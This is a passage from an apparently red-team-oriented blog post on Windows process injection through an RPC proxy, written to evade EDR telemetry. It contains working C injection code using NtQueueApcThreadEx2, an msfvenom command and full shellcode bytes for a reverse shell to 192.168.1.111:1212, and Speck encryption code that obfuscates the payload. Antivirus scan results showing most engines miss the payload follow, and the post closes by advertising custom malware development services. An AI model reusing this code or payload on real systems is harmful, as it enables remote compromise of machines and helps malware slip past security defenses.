        printf("[SERVER ERROR] TriggerInjection: Decryption buffer is NULL\n");
        const char* msg = "Decryption buffer not initialized";
        *response = (unsigned char*)midl_user_allocate(strlen(msg) + 1);
        strcpy((char*)*response, msg);
        return;
    }

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!processHandle) {
        printf("[SERVER ERROR] TriggerInjection: OpenProcess failed (0x%08x)\n", GetLastError());
        const char* msg = "Failed to open target process";
        *response = (unsigned char*)midl_user_allocate(strlen(msg) + 1);
        strcpy((char*)*response, msg);
        return;
    }

    printf("[SERVER] TriggerInjection: Process opened successfully\n");

    LPVOID remoteMem = (LPVOID)(ULONG_PTR)allocMem;
    if (!remoteMem) {
        printf("[SERVER ERROR] TriggerInjection: allocMem is NULL\n");
        CloseHandle(processHandle);
        return;
    }

    /*SIZE_T written;
     if (!WriteProcessMemory(processHandle, remoteMem, g_DecryptBuffer, g_PaddedLen, &written)) {
         printf("[SERVER ERROR] TriggerInjection: WriteProcessMemory failed (0x%08x)\n", GetLastError());
         CloseHandle(processHandle);
         return;
     }*/

 VOID* pebUnused = getPEBUnused(processHandle);
 if (!pebUnused) {
        printf("[SERVER ERROR] TriggerInjection: Failed to find unused PEB address\n");
        CloseHandle(processHandle);
        return;
    }

 HANDLE hThread = findThread(processHandle, THREAD_ALL_ACCESS);
    if (hThread == INVALID_HANDLE_VALUE) {
        printf("[SERVER ERROR] TriggerInjection: Failed to find a suitable thread in the target process\n");
        CloseHandle(processHandle);
        return;
 }

 printf("[SERVER] TriggerInjection: Found unused PEB address at 0x%p\n", pebUnused);
 printf("[SERVER] TriggerInjection: Found thread handle 0x%p\n", hThread);
 LPVOID writtenPtr = CustomWriteProcessMemory(processHandle, g_DecryptBuffer, g_PaddedLen, pebUnused, hThread, remoteMem);
    if (!writtenPtr) {
        printf("[SERVER ERROR] TriggerInjection: CustomWriteProcessMemory failed\n");
        CloseHandle(processHandle);
  return;
 }



    printf("[SERVER SUCCESS] TriggerInjection: Wrote shellc0de bytes\n");

   /* HANDLE hThreadd = CreateRemoteThread(
        processHandle,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL,
        0,
        NULL
    );

    if (!hThreadd) {
        printf("[SERVER ERROR] TriggerInjection: CreateRemoteThread failed (0x%08x)\n", GetLastError());
        CloseHandle(processHandle);
        return;
    }*/

    using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
        HANDLE ThreadHandle,
        HANDLE ReserveHandle,
        ULONG ApcFlags,
        PPS_APC_ROUTINE ApcRoutine,
        PVOID ApcArgument1,
        PVOID ApcArgument2,
        PVOID ApcArgument3
        );

    resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));

    DWORD res = fNtQueueApcThreadEx2(hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
        (PPS_APC_ROUTINE)remoteMem, NULL, NULL, NULL);

 printf("NtQueueApcThreadEx2 result: 0x%08x\n", res);

    printf("[SERVER SUCCESS] TriggerInjection: APC Injected in remote thread\n");

    CloseHandle(hThread);
    CloseHandle(processHandle);
    free(g_DecryptBuffer);
    g_DecryptBuffer = NULL;

    const char* reply = "Injection succeeded";
    *response = (unsigned char*)midl_user_allocate(strlen(reply) + 1);
    strcpy((char*)*response, reply);

    printf("[SERVER SUCCESS] TriggerInjection: Completed successfully\n");
}

// ==================== RPC MEMORY ====================
void* __RPC_USER midl_user_allocate(size_t len) {
    return malloc(len);
}

void __RPC_USER midl_user_free(void* ptr) {
    free(ptr);
}

// ==================== MAIN ====================
// midl /env x64 /robust message.idl
// Include message_s.c and message.h

int main()
{
    RPC_STATUS status;

    status = RpcServerUseProtseqEpA(
        (RPC_CSTR)"ncalrpc",
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        (RPC_CSTR)"MessageRPC",
        NULL
    );

    if (status) return status;

    status = RpcServerRegisterIf(
        MessageRPC_v1_0_s_ifspec,
        NULL,
        NULL
    );

    if (status) return status;

    printf("[SERVER] RPC Server running...\n");

    status = RpcServerListen(
        1,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        FALSE
    );

    return status;
}
```

## Proof of Concept

We start creating the shellcode:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.111 LPORT=1212 -f c EXITFUNC=thread
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of c file: 1963 bytes
unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x04\xbc\xc0\xa8\x01\x6f"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
```

Then just encrypt the shellcode using the speck encryption code:

```
// Based on original code from:
// https://cocomelonc.github.io/malware/2025/05/29/malware-cryptography-42.html

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#define ROUNDS 45
#define BLOCK_BYTES 16

uint64_t roundKeys[ROUNDS];

// Generate the CRC32 table
uint32_t crc32Table[256];
void generateCrc32Table() {
 for (uint32_t i = 0; i < 256; i++) {
  uint32_t c = i;
  for (int j = 0; j < 8; j++) {
   c = (c & 1) ? (0xEDB88320 ^ (c >> 1)) : (c >> 1);
  }
  crc32Table[i] = c;
 }
}

uint32_t crc32(const unsigned char* data, size_t length) {
 uint32_t crc = 0xFFFFFFFF;
 for (size_t i = 0; i < length; i++) {
  crc = crc32Table[(crc ^ data[i]) & 0xFF] ^ (crc >> 8);
 }
 return crc ^ 0xFFFFFFFF;
}

void parseHexKey(const char* keyStr, uint64_t key[2]) {
 char buffer[17] = { 0 };
 strncpy(buffer, keyStr, 16);
 key[0] = strtoull(buffer, NULL, 16);
 strncpy(buffer, keyStr + 16, 16);
 key[1] = strtoull(buffer, NULL, 16);
}

uint64_t rol(uint64_t x, int r) {
 return (x << r) | (x >> (64 - r));
}

uint64_t ror(uint64_t x, int r) {
 return (x >> r) | (x << (64 - r));
}

void speckKeySchedule(uint64_t key[2]) {
 roundKeys[0] = key[0];
 uint64_t b = key[1];
 for (int i = 0; i < ROUNDS - 1; i++) {
  b = (ror(b, 8) + roundKeys[i]) ^ i;
  roundKeys[i + 1] = rol(roundKeys[i], 3) ^ b;
 }
}

void speckEncrypt(uint64_t* x, uint64_t* y) {
 for (int i = 0; i < ROUNDS; i++) {
  *x = (ror(*x, 8) + *y) ^ roundKeys[i];
  *y = rol(*y, 3) ^ *x;
 }
}

void speckDecrypt(uint64_t* x, uint64_t* y) {
 for (int i = ROUNDS - 1; i >= 0; i--) {
  *y = ror(*y ^ *x, 3);
  *x = rol((*x ^ roundKeys[i]) - *y, 8);
 }
}

// Simple 64-bit random number generator
uint64_t rand64() {
 return ((uint64_t)rand() << 32) | rand();
}

int main() {
 generateCrc32Table();
 srand((unsigned int)time(NULL)); // Seed for random IV

 //unsigned char payload[] = {

//unsigned int agent_x64_bin_len = 88063;

 //unsigned int agent_x64_bin_len = 88063;

 unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x04\xbc\xc0\xa8\x01\x6f"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

 //const char* keyStr = "f7Ea9C2b4D10xL8zQ5Wk3P6rIeG0jN7o";
 const char* keyStr = "A9xK4R0E2Wc6B1D8P5N7ZL3GJQPfIeMy";
 //const char* keyStr = "19181110090801001110980801000908";
 uint64_t key[2];
 parseHexKey(keyStr, key);
 speckKeySchedule(key);

 int payloadLen = sizeof(payload) - 1;
 printf("Original payload size: %d bytes\n", payloadLen);
 int paddedLen = (payloadLen + BLOCK_BYTES - 1) & ~(BLOCK_BYTES - 1);

 // Allocate buffer for IV + encrypted shellcode
 unsigned char* encryptedBuffer = (unsigned char*)calloc(1, BLOCK_BYTES + paddedLen);
 if (!encryptedBuffer) return 1;

 // Copy shellcode to encryption buffer (implicit zero padding)
 memcpy(encryptedBuffer + BLOCK_BYTES, payload, payloadLen);

 // Create random IV and place it at the start of the buffer
 uint64_t* iv = (uint64_t*)encryptedBuffer;
 iv[0] = rand64();
 iv[1] = rand64();

 // Speck encryption in CBC mode
 uint64_t prev[2] = { iv[0], iv[1] };
 for (int i = 0; i < paddedLen; i += BLOCK_BYTES) {
  uint64_t* block = (uint64_t*)(encryptedBuffer + BLOCK_BYTES + i);
  block[0] ^= prev[0];
  block[1] ^= prev[1];
  speckEncrypt(&block[0], &block[1]);
  prev[0] = block[0];
  prev[1] = block[1];
 }

 // ==================== ENHANCED OUTPUT ====================
 int totalLen = BLOCK_BYTES + paddedLen;

 printf("\n=== Format 1: C-style Array (with line breaks) ===\n");
 printf("unsigned char shellcode[] = {");
 for (int i = 0; i < totalLen; i++) {
  if (i % 16 == 0) printf("\n    ");
  printf("0x%02x", encryptedBuffer[i]);
  if (i < totalLen - 1) printf(", ");
 }
 printf("\n};\n");

 printf("\n=== Format 2: Hex Dump ===\n");
 for (int i = 0; i < totalLen; i += 16) {
  printf("0x%03x:  ", i);
  for (int j = 0; j < 16; j++) {
   if (i + j < totalLen) {
    printf("0x%02x, ", encryptedBuffer[i + j]);
   }
   else {
    printf("      ");
   }
  }
  printf("\n");
 }

 printf("\n=== Format 3: Original Compact Format ===\n");
 printf("Encrypted Shellcode + IV:\n");
 for (int i = 0; i < totalLen; i++) {
  printf("\\x%02x", encryptedBuffer[i]);
 }
 printf("\n\n");

 // ==================== DECRYPTION ====================
 unsigned char* decryptBuffer = (unsigned char*)malloc(paddedLen);
 memcpy(decryptBuffer, encryptedBuffer + BLOCK_BYTES, paddedLen);

 uint64_t prevDecrypt[2] = { iv[0], iv[1] };
 for (int i = 0; i < paddedLen; i += BLOCK_BYTES) {
  uint64_t* block = (uint64_t*)(decryptBuffer + i);
  uint64_t temp[2] = { block[0], block[1] };
  speckDecrypt(&block[0], &block[1]);
  block[0] ^= prevDecrypt[0];
  block[1] ^= prevDecrypt[1];
  prevDecrypt[0] = temp[0];
  prevDecrypt[1] = temp[1];
 }

 // CRC32 verification
 uint32_t origCrc = crc32(payload, payloadLen);
 uint32_t decCrc = crc32(decryptBuffer, payloadLen);

 printf("Decrypted Payload CRC32: 0x%08X\n", decCrc);
 printf("Original  Payload CRC32: 0x%08X\n", origCrc);

 if (origCrc == decCrc)
  printf("\nDecryption OK: payload restored.\n");
 else
  printf("\nDecryption FAILED: corruption detected.\n");

 free(encryptedBuffer);
 free(decryptBuffer);
 return 0;
}
```

Then we copy the encrypted shellcode generated at the execution to the code of the **RPCProxy.**

And then remember from the first post, you need to compile the **IDL** file, in this case, for x64 we need to execute the following command from the **Developer Command Prompt for VS (** automatically installed with Visual Studio **)**

**IDL File:**

```
[\
    uuid(12345678-1234-1234-1234-123456789abc),\
    version(1.0)\
]
interface MessageRPC
{
    void TriggerInjection(
        [in] handle_t IDL_handle,
        [in] int pid,
        [in] hyper allocMem,   // LPVOID
        [in] hyper hProcess,   // HANDLE
        [out, string] unsigned char** response
    );

    void GetSize(
        [in] handle_t IDL_handle,
        [out] hyper* size
    );
}
```

**Command:**

```
midl /env x64 /robust message.idl
```

This command creates 3 files:

- **message.h:** Add this file in both projects, server and client
- **message\_c.c:** Add this file just in the **client (** DLL) project
- **message\_s.c:** Add this file just in the **server** project

Then we can just execute both code’s, the first one, of course, the server:

```
[SERVER] RPC Server running...
```

And when we inject the DLL:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*nXWAsMMUaXiotoh1c2RvvA.png)

…

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*MMpsmidDqP6iudUff42JBA.png)

Perfect!

## Detection

Now it’s time to see if the defenses are detecting this as a malicious threat, just the .exe in the static analysis

### Kleenscan API

```
[+] Scan success: True
[+] HTTP Code: 200
[+] Message: OK

[*] Antivirus Scan Results:

  - alyac                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - amiti                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - arcabit              | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - avast                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - avg                  | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - avira                | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-02-16
  - bullguard            | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - clamav               | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - comodolinux          | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - crowdstrike          | Status: ok         | Flag: Threat Detected                | Updated: 2026-02-16
  - drweb                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - emsisoft             | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - escan                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - fprot                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - fsecure              | Status: scanning   | Flag: Scanning results incomplete    | Updated: 2026-02-16
  - gdata                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - ikarus               | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - immunet              | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - kaspersky            | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - maxsecure            | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - mcafee               | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - microsoftdefender    | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - nano                 | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - nod32                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - norman               | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - secureageapex        | Status: ok         | Flag: Unknown                        | Updated: 2026-02-16
  - seqrite              | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - sophos               | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - threatdown           | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - trendmicro           | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - vba32                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - virusfighter         | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - xvirus               | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - zillya               | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - zonealarm            | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
  - zoner                | Status: ok         | Flag: Undetected                     | Updated: 2026-02-16
```

### Litterbox

Static Analysis:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*SI5x_4L7Arz_knEqrQ5XZg.png)

Dynamic Analysis:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*e9By6rrdGP2TihmKlysjvw.png)

```

#1 peIntegrity
2026-02-17 09:40:04
Process: 8034a38b757c5ffb968905da965f4bdb_RPCProxy.exe (PID: 2880)
Level: suspect
Details: Executable region 00007ff921c4e000 does not aligned with section header
Parsed Details:
region_address: 00007ff921c4e000
region_decimal: 140707990134784
Module Information
Base Address: 0x7ff921bb0000
Path: \Device\HarddiskVolume3\Windows\System32\apphelp.dll
Size: 0.63 MB
```

### ThreatCheck

![](https://miro.medium.com/v2/resize:fit:290/1*xUsy_0XynN7OCHId9dpCqg.png)

### Windows Defender

Undetected

### Elastic EDR

Detected!

Malware Prevention Alert! We evade the event of WriteProcessMemory but not the Elastic Defend in Prevent mode.

### Bitdefender Free AV

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*SLv4Jhj9F9ucAEg3dHQmJg.png)

Detected the DLL as malicious

## Conclusions

In summary, this second installment demonstrates that even standard, legitimate Windows features like **Thread Descriptions** and **Asynchronous Procedure Calls (APCs)** can be weaponized to bypass advanced behavioral telemetry. By replacing noisy APIs like `WriteProcessMemory` and `CreateRemoteThread` with a sophisticated data-smuggling loop using `NtQueueApcThreadEx2`, we’ve effectively blinded the Elastic EDR event for cross-process memory writes, this proof of concept highlights the critical importance of monitoring undocumented native functions and unconventional use cases of the RPC protocol in modern malware development.

**📌 Follow me:** [YouTube](https://www.youtube.com/@0x12darkdev) \| 🐦 [X](https://x.com/Salsa12__) \| 💬 [Discord Server](https://discord.gg/K2HqYuj5Tv) \| 📸 [Instagram](https://www.instagram.com/malwaredevs12) \| [Newsletter](https://0x12darkdevelopmentnewsletter.eo.page/q41nr)

We help security teams enhance offensive capabilities with precision-built tooling and expert guidance, from custom malware to advanced evasion strategies

[**Offensive Development Consultant** \\
\\
**We developed specialized malware for security professionals**\\
\\
0x12darkdev.net](https://0x12darkdev.net/offensive-development-services/?source=post_page-----7eac298508c2---------------------------------------)

**S12.**

[Malware](https://medium.com/tag/malware?source=post_page-----7eac298508c2---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----7eac298508c2---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----7eac298508c2---------------------------------------)

[Pentesting](https://medium.com/tag/pentesting?source=post_page-----7eac298508c2---------------------------------------)

[Red Team](https://medium.com/tag/red-team?source=post_page-----7eac298508c2---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:48:48/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--7eac298508c2---------------------------------------)

[![S12 - 0x12Dark Development](https://miro.medium.com/v2/resize:fill:64:64/1*NlusgtOWLGgb5Bukla3xFw.jpeg)](https://medium.com/@s12deff?source=post_page---post_author_info--7eac298508c2---------------------------------------)

Follow

[**Written by S12 - 0x12Dark Development**](https://medium.com/@s12deff?source=post_page---post_author_info--7eac298508c2---------------------------------------)

[4.1K followers](https://medium.com/@s12deff/followers?source=post_page---post_author_info--7eac298508c2---------------------------------------)

· [51 following](https://medium.com/@s12deff/following?source=post_page---post_author_info--7eac298508c2---------------------------------------)

Red Team Enthusiast [https://0x12darkdev.net/](https://0x12darkdev.net/)

Follow

## No responses yet

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

Write a response

[What are your thoughts?](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40s12deff%2Frpc-proxy-injection-part-ii-breaking-elastic-edr-telemetry-7eac298508c2&source=---post_responses--7eac298508c2---------------------respond_sidebar------------------)

Cancel

Respond

[Help](https://help.medium.com/hc/en-us?source=post_page-----7eac298508c2---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----7eac298508c2---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----7eac298508c2---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----7eac298508c2---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----7eac298508c2---------------------------------------)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----7eac298508c2---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----7eac298508c2---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----7eac298508c2---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----7eac298508c2---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**